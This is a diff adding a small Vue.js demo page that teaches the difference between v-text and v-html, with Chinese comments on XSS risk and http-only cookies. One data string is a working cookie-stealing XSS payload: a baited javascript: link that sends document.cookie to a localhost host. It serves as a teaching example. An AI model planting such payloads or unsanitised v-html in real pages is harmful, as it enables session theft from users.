@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div v-text="str"></div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+
+    </div>
+    <script>
+        Vue.config.productionTip = false;
+        new Vue({
+            el:'#root',
+            data:{
+                str:'<span>hello shiyixi</span>',
+                // location.href实现页面跳转，并携带当前网站的cookie信息
+                str2:'<a href=javascript:location.href="http://localhost:8080?"+document.cookie>点我有好东西可以看哟</a>'
+                // 为了避免这个严重漏洞，浏览器在设计时，可以未cookie键值对设置了'http-only',使得只有http请求才能够拿到cookie信息，但难免
+                // 会有服务器设计不完善，因此，在使用v-html这个标签属性时要小心，否则会被xss攻击
+            }
+        })
+    </script>
+</body>
+</html>
